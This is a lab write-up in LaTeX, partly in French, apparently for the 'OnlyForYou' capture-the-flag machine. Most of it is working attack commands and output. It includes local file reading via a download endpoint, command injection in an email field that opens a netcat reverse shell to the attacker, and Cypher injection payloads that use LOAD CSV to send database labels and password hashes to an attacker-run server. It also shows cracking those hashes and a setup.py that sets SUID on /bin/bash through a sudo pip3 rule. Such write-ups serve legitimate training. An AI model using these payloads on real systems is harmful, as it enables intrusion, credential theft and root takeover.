\chapter{OnlyForYou}
\begin{itemize}
    \item {\bf technics}: neo4j injection, pip download
    \item {\bf Components}: 
    \item {\bf tools}: 
\end{itemize}


\section{nmap}
\begin{verbatim}
$ nmapz 10.10.11.210
TCP ports found: 22,80
Starting Nmap 7.94 ( https://nmap.org ) at 2023-06-16 00:32 CEST
Nmap scan report for 10.10.11.210
Host is up (0.043s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 e8:83:e0:a9:fd:43:df:38:19:8a:aa:35:43:84:11:ec (RSA)
|   256 83:f2:35:22:9b:03:86:0c:16:cf:b3:fa:9f:5a:cd:08 (ECDSA)
|_  256 44:5f:7a:a3:77:69:0a:77:78:9b:04:e0:9f:11:db:80 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://only4you.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

\end{verbatim}

\section{http}

systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
A priori pas d'autres subdomaines que \verb+beta+

\subsection{lfi}
\begin{verbatim}
$ curl 'http://beta.only4you.htb/download' -X POST  --data-raw 'image=/etc/passwd'
root:x:0:0:root:/root:/bin/bash
...SNIP...
john:x:1000:1000:john:/home/john:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
mysql:x:113:117:MySQL Server,,,:/nonexistent:/bin/false
neo4j:x:997:997::/var/lib/neo4j:/bin/bash
dev:x:1001:1001::/home/dev:/bin/bash
fwupd-refresh:x:114:119:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
_laurel:x:996:996::/var/log/laurel:/bin/false

\end{verbatim}
Neo4j 


\begin{verbatim}


$ curl -i 'http://beta.only4you.htb/download' -X POST  \
    --data-raw 'image=/etc/nginx/nginx.conf'


curl -i 'http://beta.only4you.htb/download' -X POST  
    --data-raw 'image=/var/www/only4you.htb/app.py'

curl -i 'http://beta.only4you.htb/download' -X POST  
    --data-raw 'image=/var/www/only4you.htb/form.py'
\end{verbatim}


\begin{verbatim}
def issecure(email, ip):
    if not re.match("([A-Za-z0-9]+[.-_])*[A-Za-z0-9]+@[A-Za-z0-9-]+(\.[A-Z|a-z]{2,})", email):
        return 0
    else:
        domain = email.split("@", 1)[1]
                result = run([f"dig txt {domain}"], shell=True, stdout=PIPE)

\end{verbatim}
injection dans la partie domaine ? oui car \verb+re.match+ check en prefixe versus \verb+re.fullmatch+

\begin{verbatim}
import re

email='test@test.com|ping -c 3 10.10.16.5'
if not re.match("([A-Za-z0-9]+[.-_])*[A-Za-z0-9]+@[A-Za-z0-9-]+(\.[A-Z|a-z]{2,})", email):
    print('nok')
else:
    print(email.split("@", 1)[1])
\end{verbatim}

\begin{verbatim}
$ curl 'http://only4you.htb/' -X POST \
    -H 'Content-Type: application/x-www-form-urlencoded' \
    --data-raw 'name=test&email=test%40test.com|ping+-c+03+10.10.16.5&subject=test&message=test'

$ sudo tcpdump -i tun0 icmp
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
03:56:31.449552 IP only4you.htb > akamatsu: ICMP echo request, id 5, seq 1, length 64
03:56:31.449584 IP akamatsu > only4you.htb: ICMP echo reply, id 5, seq 1, length 64
03:56:32.549124 IP only4you.htb > akamatsu: ICMP echo request, id 5, seq 2, length 64
03:56:32.549141 IP akamatsu > only4you.htb: ICMP echo reply, id 5, seq 2, length 64
03:56:33.395941 IP only4you.htb > akamatsu: ICMP echo request, id 5, seq 3, length 64
03:56:33.395978 IP akamatsu > only4you.htb: ICMP echo reply, id 5, seq 3, length 64

\end{verbatim}

\begin{verbatim}
# rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.16.5 4444 >/tmp/f
$ curl 'http://only4you.htb/' -X POST -H 'Content-Type: application/x-www-form-urlencoded' \
    --data-raw 'name=test&email=test%40test.com|rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7Csh%20-i%202%3E%261%7Cnc%2010.10.16.5%204444%20%3E%2Ftmp%2Ff&subject=test&message=test'
$ nc -lnvp 4444
ls
Connection from 10.10.11.210:36284
sh: 0: can't access tty; job control turned off
$ app.py
form.py
only4you.sock
__pycache__
static
templates
$


\end{verbatim}

\section{www-data}

\begin{verbatim}
python -c 'import pty; pty.spawn("/bin/bash")'


$ ./chisel server -p 9999 --reverse
2023/06/16 16:40:36 server: Reverse tunnelling enabled
2023/06/16 16:40:36 server: Fingerprint u8NKPp5+e8cxgSOLmPSLzHxYb4MVK/155W5OU7G0CY0=
2023/06/16 16:40:36 server: Listening on http://0.0.0.0:9999
2023/06/16 16:41:05 server: session#1: tun: proxy#R:5555=>8001: Listening

$ chmod +x chisel
$ ./chisel client 10.10.16.5:9999 R:5555:127.0.0.1:8001



$ curl -i http://127.0.0.1:5555
HTTP/1.1 302 FOUND
Server: gunicorn/20.0.4
Date: Fri, 16 Jun 2023 14:43:25 GMT
Connection: close
Content-Type: text/html; charset=utf-8
Content-Length: 199
Location: /login
Set-Cookie: session=f8d413e6-13fa-4d58-b188-37262224105b; Expires=Fri, 16 Jun 2023 14:48:25 GMT; HttpOnly; Path=/

<!doctype html>
<html lang=en>
<title>Redirecting...</title>
<h1>Redirecting...</h1>
<p>You should be redirected automatically to the target URL: <a href="/login">/login</a>. If not, click the link.


\end{verbatim}


on peut se connecter avec \verb+admin/admin+

\verb+http://127.0.0.1:5555/employees+ serait vulnerable en injection \verb+'+

\href{https://book.hacktricks.xyz/pentesting-web/sql-injection/cypher-injection-neo4j}{Cypher Injection (neo4j)}

\begin{verbatim}
 ' OR 1=1 WITH 1 as a CALL dbms.components() YIELD name, versions, edition UNWIND versions as version LOAD CSV FROM 'http://10.10.16.5:4446/?version=' + version + '&name=' + name + '&edition=' + edition as l RETURN 0 as _0 //

$ python -m http.server 4446
Serving HTTP on 0.0.0.0 port 4446 (http://0.0.0.0:4446/) ...
 10.10.11.210 - - [17/Jun/2023 03:12:20] code 400, message Bad request syntax ('GET /?version=5.6.0&name=Neo4j Kernel&edition=community HTTP/1.1')
10.10.11.210 - - [17/Jun/2023 03:12:20] "GET /?version=5.6.0&name=Neo4j Kernel&edition=community HTTP/1.1" 400 -
\end{verbatim}

enum labels
\begin{verbatim}
' OR 1=1 WITH 1 as a CALL db.labels() yield label LOAD CSV FROM 'http://10.10.16.5:4446/?label='+label as l RETURN 0 as _0 //

10.10.11.210 - - [17/Jun/2023 03:15:01] "GET /?label=user HTTP/1.1" 200 -
10.10.11.210 - - [17/Jun/2023 03:15:02] "GET /?label=employee HTTP/1.1" 200 -
10.10.11.210 - - [17/Jun/2023 03:15:02] "GET /?label=user HTTP/1.1" 200 -
10.10.11.210 - - [17/Jun/2023 03:15:02] "GET /?label=employee HTTP/1.1" 200 -
10.10.11.210 - - [17/Jun/2023 03:15:02] "GET /?label=user HTTP/1.1" 200 -
10.10.11.210 - - [17/Jun/2023 03:15:03] "GET /?label=employee HTTP/1.1" 200 -
10.10.11.210 - - [17/Jun/2023 03:15:03] "GET /?label=user HTTP/1.1" 200 -
10.10.11.210 - - [17/Jun/2023 03:15:03] "GET /?label=employee HTTP/1.1" 200 -
10.10.11.210 - - [17/Jun/2023 03:15:04] "GET /?label=user HTTP/1.1" 200 -
10.10.11.210 - - [17/Jun/2023 03:15:04] "GET /?label=employee HTTP/1.1" 200 -
\end{verbatim}

enum users:
\begin{verbatim}
' OR 1=1 WITH 1 as a MATCH (f:user) UNWIND keys(f) as p LOAD CSV FROM 'http://10.10.16.5:4446/?' + p +'='+toString(f[p]) as l RETURN 0 as _0 //

10.10.11.210 - - [17/Jun/2023 03:16:01] "GET /?password=8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918 HTTP/1.1" 200 -
10.10.11.210 - - [17/Jun/2023 03:16:01] "GET /?username=admin HTTP/1.1" 200 -
10.10.11.210 - - [17/Jun/2023 03:16:01] "GET /?password=a85e870c05825afeac63215d5e845aa7f3088cd15359ea88fa4061c6411c55f6 HTTP/1.1" 200 -
10.10.11.210 - - [17/Jun/2023 03:16:01] "GET /?username=john HTTP/1.1" 200 -
10.10.11.210 - - [17/Jun/2023 03:16:02] "GET /?password=8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918 HTTP/1.1" 200 -
10.10.11.210 - - [17/Jun/2023 03:16:02] "GET /?username=admin HTTP/1.1" 200 -
10.10.11.210 - - [17/Jun/2023 03:16:02] "GET /?password=a85e870c05825afeac63215d5e845aa7f3088cd15359ea88fa4061c6411c55f6 HTTP/1.1" 200 -
10.10.11.210 - - [17/Jun/2023 03:16:03] "GET /?username=john HTTP/1.1" 200 -
10.10.11.210 - - [17/Jun/2023 03:16:03] "GET /?password=8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918 HTTP/1.1" 200 -
10.10.11.210 - - [17/Jun/2023 03:16:03] "GET /?username=admin HTTP/1.1" 200 -
10.10.11.210 - - [17/Jun/2023 03:16:04] "GET /?password=a85e870c05825afeac63215d5e845aa7f3088cd15359ea88fa4061c6411c55f6 HTTP/1.1" 200 -
10.10.11.210 - - [17/Jun/2023 03:16:04] "GET /?username=john HTTP/1.1" 200 -
10.10.11.210 - - [17/Jun/2023 03:16:04] "GET /?password=8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918 HTTP/1.1" 200 -
10.10.11.210 - - [17/Jun/2023 03:16:04] "GET /?username=admin HTTP/1.1" 200 -
10.10.11.210 - - [17/Jun/2023 03:16:05] "GET /?password=a85e870c05825afeac63215d5e845aa7f3088cd15359ea88fa4061c6411c55f6 HTTP/1.1" 200 -
10.10.11.210 - - [17/Jun/2023 03:16:05] "GET /?username=john HTTP/1.1" 200 -
10.10.11.210 - - [17/Jun/2023 03:16:05] "GET /?password=8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918 HTTP/1.1" 200 -
10.10.11.210 - - [17/Jun/2023 03:16:06] "GET /?username=admin HTTP/1.1" 200 -
10.10.11.210 - - [17/Jun/2023 03:16:06] "GET /?password=a85e870c05825afeac63215d5e845aa7f3088cd15359ea88fa4061c6411c55f6 HTTP/1.1" 200 -
10.10.11.210 - - [17/Jun/2023 03:16:06] "GET /?username=john HTTP/1.1" 200 -
\end{verbatim}

\begin{verbatim}
$ john --wordlist=/usr/share/wordlists/passwords/rockyou.txt --format=raw-sha256 hash
Using default input encoding: UTF-8
Loaded 2 password hashes with no different salts (Raw-SHA256 [SHA256 128/128 AVX 4x])
Warning: poor OpenMP scalability for this hash type, consider --fork=20
Will run 20 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
admin            (?)
ThisIs4You       (?)
2g 0:00:00:00 DONE (2023-06-17 03:22) 3.846g/s 20480Kp/s 20480Kc/s 20795KC/s Xavier4..SEXIMA234
Use the "--show --format=Raw-SHA256" options to display all of the cracked passwords reliably
Session completed

\end{verbatim}

\section{john}

\begin{verbatim}
$ sudo -l
Matching Defaults entries for john on only4you:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User john may run the following commands on only4you:
    (root) NOPASSWD: /usr/bin/pip3 download http\://127.0.0.1\:3000/*.tar.gz

\end{verbatim}


\begin{verbatim}
$ cat setup.py
from setuptools import setup, find_packages
from setuptools.command.install import install
from setuptools.command.egg_info import egg_info
import os

def RunCommand():
    os.system("chmod u+s /bin/bash") #to get root bash

class RunEggInfoCommand(egg_info):
    def run(self):
        RunCommand()
        egg_info.run(self)


class RunInstallCommand(install):
    def run(self):
        RunCommand()
        install.run(self)

setup(
    name = "jubeaz", #to create a pip package with this name
    version = "0.0.1", # random version, because it's necessary to have a version in the package.
    license = "MIT",
    packages=find_packages(),
    cmdclass={
        'install' : RunInstallCommand,
        'egg_info': RunEggInfoCommand
    },
)

$ python3 setup.py sdist

john@only4you:~$ sudo /usr/bin/pip3 download http://127.0.0.1:3000/john/test2/raw/master/jubeaz-0.0.1.tar.gz
Collecting http://127.0.0.1:3000/john/test2/raw/master/jubeaz-0.0.1.tar.gz
  Downloading http://127.0.0.1:3000/john/test2/raw/master/jubeaz-0.0.1.tar.gz (915 bytes)
  Saved ./jubeaz-0.0.1.tar.gz
Successfully downloaded jubeaz
john@only4you:~$ ls -la /bin/bash
-rwsr-xr-x 1 root root 1183448 Apr 18  2022 /bin/bash
john@only4you:~$

\end{verbatim}

